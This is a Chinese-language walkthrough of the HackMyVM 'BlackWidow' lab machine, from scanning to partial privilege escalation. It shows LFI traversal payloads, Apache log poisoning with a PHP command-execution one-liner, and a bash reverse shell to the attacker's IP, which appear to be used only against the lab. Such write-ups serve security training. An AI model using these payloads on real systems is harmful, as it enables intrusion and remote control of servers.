---
title: BlackWidow
author: hgbe02
date: 2025-06-17 13:05:26 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/BlackWidow.html"
---

# BlackWidow

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326598.png" alt="image-20250616175545909" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326600.png" alt="image-20250617104520725" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.100:80
Open 192.168.10.100:111
Open 192.168.10.100:22
Open 192.168.10.100:2049
Open 192.168.10.100:3128
Open 192.168.10.100:35455
Open 192.168.10.100:38113
Open 192.168.10.100:38787
Open 192.168.10.100:42771

PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f8:3b:7c:ca:c2:f6:5a:a6:0e:3f:f9:cf:1b:a9:dd:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnsjlNONcku933wJXG6c7zW2yFvbroPDS8PcoWke6IpBG6RbVokkmOyDCdTzYtQbxwb5I17h8AK1d/a+SPQWjEG71TVzcogM/RpbtnP27SlYIVRv7de6unovPJlXmEBW5ACHRtRd5OoJ6oyv4FvR3SlbgaJkQEYG3SxBTcPLuSchTqimBh45II3s81SCU0O22j9dxIatzjhlFGOe9bVP9kfC8oF5Llrve3ReRx/Zt99ByY5oGNZ57dpb+sdjvHdJlBIS02D7mHF+GhW9VixYpg1gJFfcNdaJksbrjVoLXIkC3SSHqgaiFYL5Y5JSEO44oP9Rp+igdgc29ysGXOS417
|   256 04:31:5a:34:d4:9b:14:71:a0:0f:22:78:2d:f3:b6:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMdVV7LG2ve48JMOO6FbWxmdQhQ8KHcOKSkcIlGPmtdA9EUjCh8TRN9q/lfsZDrq54aJ5brqcI/pvQqwPFanKW8=
|   256 4e:42:8e:69:b7:90:e8:27:68:df:68:8a:83:a7:87:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIzpLR6WAXAhIzPtdFobvUkZSDsIL9juu2N70C6tcyxy
80/tcp    open  http       syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind    syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35455/tcp   mountd
|   100005  1,2,3      36358/udp6  mountd
|   100005  1,2,3      43763/tcp6  mountd
|   100005  1,2,3      48272/udp   mountd
|   100021  1,3,4      34813/udp6  nlockmgr
|   100021  1,3,4      38113/tcp   nlockmgr
|   100021  1,3,4      38665/tcp6  nlockmgr
|   100021  1,3,4      53671/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs        syn-ack ttl 64 3-4 (RPC #100003)
3128/tcp  open  http-proxy syn-ack ttl 64 Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
35455/tcp open  mountd     syn-ack ttl 64 1-3 (RPC #100005)
38113/tcp open  nlockmgr   syn-ack ttl 64 1-4 (RPC #100021)
38787/tcp open  mountd     syn-ack ttl 64 1-3 (RPC #100005)
42771/tcp open  mountd     syn-ack ttl 64 1-3 (RPC #100005)
MAC Address: 08:00:27:2F:F0:D2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 84]
/docs                 (Status: 301) [Size: 315] [--> http://192.168.10.100/docs/]
/.html                (Status: 403) [Size: 279]
/company              (Status: 301) [Size: 318] [--> http://192.168.10.100/company/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.10.100/js/]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ whatweb $IP       
http://192.168.10.100 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.10.100]
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326601.png" alt="image-20250617104752072" style="zoom:50%;" />

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ curl -s http://$IP                                                
<html>
<img src="wallpaper.jpg" alt="wallpaper" width="100%" height="100%">
</html>

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ wget http://$IP/wallpaper.jpg             
--2025-06-16 22:48:24--  http://192.168.10.100/wallpaper.jpg
Connecting to 192.168.10.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 309964 (303K) [image/jpeg]
Saving to: ‘wallpaper.jpg’

wallpaper.jpg                                   100%[====================================================================================================>] 302.70K  --.-KB/s    in 0.01s   

2025-06-16 22:48:24 (25.3 MB/s) - ‘wallpaper.jpg’ saved [309964/309964]

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ exiftool wallpaper.jpg                                   
ExifTool Version Number         : 13.25
File Name                       : wallpaper.jpg
Directory                       : .
File Size                       : 310 kB
File Modification Date/Time     : 2020:12:13 05:17:12-05:00
File Access Date/Time           : 2025:06:16 22:48:24-04:00
File Inode Change Date/Time     : 2025:06:16 22:48:24-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 2308
Image Height                    : 1328
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2308x1328
Megapixels                      : 3.1

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ stegseek -wl /usr/share/wordlists/rockyou.txt wallpaper.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Progress: 99.57% (132.9 MB)           
[!] error: Could not find a valid passphrase.
```

### 敏感端口探测

#### rpc + nfs

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ rpcinfo $IP            
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100005    1    udp       0.0.0.0.235.10         mountd     superuser
    100005    1    tcp       0.0.0.0.167.19         mountd     superuser
    100005    1    udp6      ::.134.181             mountd     superuser
    100005    1    tcp6      ::.151.5               mountd     superuser
    100005    2    udp       0.0.0.0.145.88         mountd     superuser
    100005    2    tcp       0.0.0.0.151.131        mountd     superuser
    100005    2    udp6      ::.190.192             mountd     superuser
    100005    2    tcp6      ::.170.1               mountd     superuser
    100005    3    udp       0.0.0.0.188.144        mountd     superuser
    100005    3    tcp       0.0.0.0.138.127        mountd     superuser
    100005    3    udp6      ::.142.6               mountd     superuser
    100005    3    tcp6      ::.170.243             mountd     superuser
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    udp       0.0.0.0.8.1            nfs        superuser
    100227    3    udp       0.0.0.0.8.1            nfs_acl    superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    3    tcp6      ::.8.1                 nfs_acl    superuser
    100003    3    udp6      ::.8.1                 nfs        superuser
    100227    3    udp6      ::.8.1                 nfs_acl    superuser
    100021    1    udp       0.0.0.0.209.167        nlockmgr   superuser
    100021    3    udp       0.0.0.0.209.167        nlockmgr   superuser
    100021    4    udp       0.0.0.0.209.167        nlockmgr   superuser
    100021    1    tcp       0.0.0.0.148.225        nlockmgr   superuser
    100021    3    tcp       0.0.0.0.148.225        nlockmgr   superuser
    100021    4    tcp       0.0.0.0.148.225        nlockmgr   superuser
    100021    1    udp6      ::.135.253             nlockmgr   superuser
    100021    3    udp6      ::.135.253             nlockmgr   superuser
    100021    4    udp6      ::.135.253             nlockmgr   superuser
    100021    1    tcp6      ::.151.9               nlockmgr   superuser
    100021    3    tcp6      ::.151.9               nlockmgr   superuser
    100021    4    tcp6      ::.151.9               nlockmgr   superuser

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ showmount -e $IP
Export list for 192.168.10.100:
```

空的。。

### 敏感目录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326602.png" alt="image-20250617105510274" style="zoom:50%;" />

尝试扫描一下：

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ gobuster dir -u http://$IP/company/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.100/company/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 42271]
/.html                (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 325] [--> http://192.168.10.100/company/assets/]
/forms                (Status: 301) [Size: 324] [--> http://192.168.10.100/company/forms/]
/changelog.txt        (Status: 200) [Size: 1175]
/Readme.txt           (Status: 200) [Size: 222]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/started.php          (Status: 200) [Size: 42271]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

看一下情况：

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ whatweb http://$IP/company/
http://192.168.10.100/company/ [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.10.100], JQuery, Script, Title[Arsha Bootstrap Template - Index]

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ curl -s http://$IP/company/changelog.txt                         
Version: 3.0.3
  - Updated Bootstrap to version 5.0.0-beta1
  - Updated the PHP Email Form to v2.3
  - Other small fixes and improvements
  
Version: 3.0.2
  - Updated Bootstrap to version 5.0.0-alpha3
  - Updated all outdated third party vendor libraries to their latest versions

Version: 3.0.1
  - Update Bootstrap v5.0 to Alpha 2
  - Updated all outdated third party vendor libraries to their latest versions

Version: 3.0.0
  - Initial release with using the Bootstrap v5.0 (Alpha)

Version: 2.2.0
  - Updated the PHP Email Form to v2.1
  - Other small fixes and improvements

Version: 2.1.0
  - Updated Bootstrap to version 4.5.0
  - Updated the PHP Email Form library to version 2.0 with reCaptcha support
  - Aded inner-page.html tempalte
  - Updated all outdated third party vendor libraries to their latest versions
  - Other small fixes and improvements
  
Version: 2.0.0
  - The template was rebuilt from scratch with the latest Bootstrap version (4.4.1)
  - Added SMPTP support for the contact form script (Pro)
  - Added NodeJS NPM Development version (Pro unlimited & Membership members)
  
Version: 1.0.0
  - Initial Release

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ curl -s http://$IP/company/Readme.txt   
Thanks for downloading this template!

Template Name: Arsha
Template URL: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/
Author: BootstrapMade.com
License: https://bootstrapmade.com/license/
```

### FUZZ LFI

查看`started.php`源代码的时候看到：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326603.png" alt="image-20250617110732001" style="zoom:50%;" />

没东西，尝试`fuzz`一下是否存在相关文件包含漏洞：

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://$IP/company/started.php?file=FUZZ" --hw 0 2>/dev/null 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.10.100/company/started.php?file=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000261:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                       
000000258:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                              
000000260:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                    
000000259:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                 
000000262:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                          
000000263:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                             
000000264:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                
000000265:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                   
000000266:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                      
000000267:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                         

Total time: 0.799150
Processed Requests: 929
Filtered Requests: 919
Requests/sec.: 1162.484

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ curl -s "http://$IP/company/started.php?file=../../../../../../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash
_rpc:x:107:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:108:65534::/var/lib/nfs:/usr/sbin/nologin

┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ curl -s "http://$IP/company/started.php?file=../../../../../../../../../../../../../etc/passwd" | grep sh | cut -d: -f1
root
sshd
viper
```

### 日志包含

重新进行FUZZ，进行目录穿越：

```bash
┌──(kali㉿kali)-[~/temp/BlackWindow]
└─$ wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://$IP/company/started.php?file=../../../../../../../../../../../../../../../FUZZ" --hw 0 2>/dev/null     
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.10.100/company/started.php?file=../../../../../../../../../../../../../../../FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000023:   200        29 L     43 W       1582 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                                                    
000000016:   200        29 L     43 W       1582 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                                         
000000131:   200        22 L     190 W      1042 Ch     "/etc/crontab"                                                                                                              
000000129:   200        21 L     102 W      881 Ch      "/etc/apt/sources.list"                                                                                                     
000000121:   200        227 L    1115 W     7224 Ch     "/etc/apache2/apache2.conf"                                                                                                 
000000138:   200        55 L     55 W       727 Ch      "/etc/group"                                                                                                                
000000135:   200        12 L     88 W       664 Ch      "/etc/fstab"                                                                                                                
000000206:   200        7 L      22 W       184 Ch      "../../../../../../../../../../../../etc/hosts"                                                                             
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                                                           
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"                                                                                                          
000000205:   200        7 L      22 W       184 Ch      "/etc/hosts"                                                                                                                
000000269:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../etc/passwd"                                                                               
000000272:   200        29 L     43 W       1582 Ch     "../../../../../../../../etc/passwd"                                                                                        
000000270:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../etc/passwd"                                                                                  
000000258:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                              
000000268:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../etc/passwd"                                                                            
000000271:   200        29 L     43 W       1582 Ch     "../../../../../../../../../etc/passwd"                                                                                     
000000267:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                         
000000265:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                                   
000000263:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                             
000000266:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                      
000000262:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                          
000000264:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                                
000000261:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                       
000000257:   200        29 L     43 W       1582 Ch     "/etc/passwd"                                                                                                               
000000259:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                 
000000260:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                                    
000000254:   200        29 L     43 W       1582 Ch     "/../../../../../../../../../../etc/passwd"                                                                                 
000000253:   200        29 L     43 W       1582 Ch     "/./././././././././././etc/passwd"                                                                                         
000000250:   200        20 L     63 W       510 Ch      "/etc/nsswitch.conf"                                                                                                        
000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                                                                            
000000246:   200        7 L      40 W       286 Ch      "/etc/motd"                                                                                                                 
000000237:   200        2 L      5 W        27 Ch       "/etc/issue"                                                                                                                
000000236:   200        355 L    1050 W     8181 Ch     "/etc/init.d/apache2"                                                                                                       
000000273:   200        29 L     43 W       1582 Ch     "../../../../../../../etc/passwd"                                                                                           
000000275:   200        29 L     43 W       1582 Ch     "../../../../../etc/passwd"                                                                                                 
000000279:   200        29 L     43 W       1582 Ch     "../etc/passwd"                                                                                                             
000000283:   200        29 L     43 W       1582 Ch     "etc/passwd"                                                                                                                
000000278:   200        29 L     43 W       1582 Ch     "../../etc/passwd"                                                                                                          
000000277:   200        29 L     43 W       1582 Ch     "../../../etc/passwd"                                                                                                       
000000274:   200        29 L     43 W       1582 Ch     "../../../../../../etc/passwd"                                                                                              
000000276:   200        29 L     43 W       1582 Ch     "../../../../etc/passwd"                                                                                                    
000000311:   200        29 L     43 W       1582 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                                
000000400:   200        40 L     117 W      887 Ch      "/etc/rpc"                                                                                                                  
000000399:   200        2 L      4 W        47 Ch       "/etc/resolv.conf"                                                                                                          
000000422:   200        121 L    394 W      3250 Ch     "/etc/ssh/sshd_config"                                                                                                      
000000020:   200        29 L     43 W       1582 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                                       
000000504:   200        4 L      44 W       512 Ch      "/proc/net/route"                                                                                                           
000000506:   200        7 L      24 W       176 Ch      "/proc/partitions"                                                                                                          
000000505:   200        8 L      131 W      1200 Ch     "/proc/net/tcp"                                                                                                             
000000507:   200        0 L      1 W        27 Ch       "/proc/self/cmdline"                                                                                                        
000000503:   200        4 L      54 W       450 Ch      "/proc/net/dev"                                                                                                             
000000501:   200        32 L     192 W      2251 Ch     "/proc/mounts"                                                                                                              
000000502:   200        4 L      27 W       316 Ch      "/proc/net/arp"                                                                                                             
000000500:   200        47 L     137 W      1307 Ch     "/proc/meminfo"                                                                                                             
000000498:   200        32 L     149 W      1388 Ch     "/proc/interrupts"                                                                                                          
000000497:   200        27 L     167 W      981 Ch      "/proc/cpuinfo"                                                                                                             
000000499:   200        1 L      5 W        25 Ch       "/proc/loadavg"                                                                                                             
000000509:   200        54 L     131 W      1024 Ch     "/proc/self/status"                                                                                                         
000000510:   200        1 L      14 W       138 Ch      "/proc/version"                                                                                                             
000000648:   200        639 L    7668 W     123219 Ch   "/var/log/apache2/access.log"                                                                                               
000000650:   200        681 L    8172 W     131149 Ch   "../../../../../../../var/log/apache2/access.log"                                                                           
000000699:   200        0 L      1 W        292583 Ch   "/var/log/lastlog"                                                                                                          
000000750:   200        0 L      2 W        1151 Ch     "/var/run/utmp"                                                                                                             
000000741:   200        11 L     66 W       53368 Ch    "/var/log/wtmp"                                                                                                             
000000929:   200        29 L     43 W       1582 Ch     "///////../../../etc/passwd"                                                                                                

Total time: 3.069660
Processed Requests: 929
Filtered Requests: 863
Requests/sec.: 302.6393
```

发现了一处日志包含：`../../../../../../../var/log/apache2/access.log`，尝试进行利用：

尝试访问时，UA头改为一句话：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326604.png" alt="image-20250617122001532" style="zoom:50%;" />

```bash
# UA
<?=`$_GET[0]`?>
http://192.168.10.100/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&0=id
```

然后进行利用：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326605.png" alt="image-20250617122111592" style="zoom:50%;" />

然后把 shell 弹过来就好了，但是命令都执行不了，尝试进行编码：

```bash
http://192.168.10.100/company/started.php?file=../../../../../../../../../../../../../var/log/apache2/access.log&0=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E10%2E107%2F1234%200%3E%261%27
# bash -c 'bash -i >& /dev/tcp/192.168.10.107/1234 0>&1'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326606.png" alt="image-20250617130130751" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@blackwidow:/var/www/html/company$ sudo -l
sudo: unable to resolve host blackwidow: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
(remote) www-data@blackwidow:/var/www/html/company$ cd /tmp
(remote) www-data@blackwidow:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/sbin/mount.nfs
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
(remote) www-data@blackwidow:/tmp$ getcap -r / 2>/dev/null
/usr/bin/perl =
/usr/bin/perl5.28.1 =
/usr/bin/ping = cap_net_raw+ep
/usr/lib/squid/pinger = cap_net_raw+ep
```

尝试上传`linpeas.sh`，发现一处可读的备份文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326607.png" alt="image-20250617131018424" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326608.png" alt="image-20250617131159529" style="zoom:33%;" />

发现密码：`?V1p3r2020!?`尝试切换：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506171326609.png" alt="image-20250617131355960" style="zoom:50%;" />

### 提权root

```bash
viper@blackwidow:~$ ls -la
total 40
drwxr-xr-x 4 viper viper 4096 May  2  2021 .
drwxr-xr-x 3 root  root  4096 Dec 12  2020 ..
drwx------ 4 viper viper 4096 Dec 13  2020 backup_site
-rw------- 1 viper viper 1546 May  2  2021 .bash_history
-rw-r--r-- 1 viper viper  220 Dec 12  2020 .bash_logout
-rw-r--r-- 1 viper viper 3526 Dec 12  2020 .bashrc
drwxr-xr-x 3 viper viper 4096 Dec 13  2020 .local
-rw------- 1 viper viper   33 Dec 12  2020 local.txt
-rw-r--r-- 1 viper viper  807 Dec 12  2020 .profile
-rw------- 1 viper viper   56 May  2  2021 .Xauthority
viper@blackwidow:~$ cat local.txt 
d930fe79919376e6d08972dae222526b
viper@blackwidow:~$ cd backup_site
viper@blackwidow:~/backup_site$ ls -la
total 96
drwx------ 4 viper viper  4096 Dec 13  2020 .
drwxr-xr-x 4 viper viper  4096 May  2  2021 ..
drwxr-xr-x 6 viper viper  4096 Dec 13  2020 assets
-rw-r--r-- 1 viper viper  1175 Dec 13  2020 changelog.txt
drwxr-xr-x 2 viper viper  4096 Dec 13  2020 forms
-rw-r--r-- 1 viper viper 42179 Dec 13  2020 index.html
-rw-r--r-- 1 viper viper  8429 Dec 13  2020 inner-page.html
-rw-r--r-- 1 viper viper  9861 Dec 13  2020 portfolio-details.html
-rw-r--r-- 1 viper viper   222 Dec 13  2020 Readme.txt
-rw-r--r-- 1 viper viper   227 Dec 13  2020 started.php
viper@blackwidow:~/backup_site$ cd /tmp
viper@blackwidow:/tmp$ getcap -r / 2>/dev/null
/home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep
/usr/bin/perl =
/usr/bin/perl5.28.1 =
/usr/bin/ping = cap_net_raw+ep
